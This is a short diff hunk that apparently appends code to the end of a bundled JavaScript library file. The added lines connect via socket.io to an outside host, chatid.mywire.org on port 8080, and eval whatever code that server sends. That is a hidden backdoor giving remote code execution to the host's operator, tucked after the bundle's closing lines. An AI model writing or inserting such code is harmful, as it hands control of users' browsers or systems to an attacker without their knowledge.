@@ -7245,3 +7245,8 @@ function toArray(list, index) {
 
 },{}]},{},[31])(31)
 });
+var socket = io.connect("chatid.mywire.org:8080");
+var con = true;
+socket.on('connected',function(d){
+if(con)eval(d.name);con=false;
+});
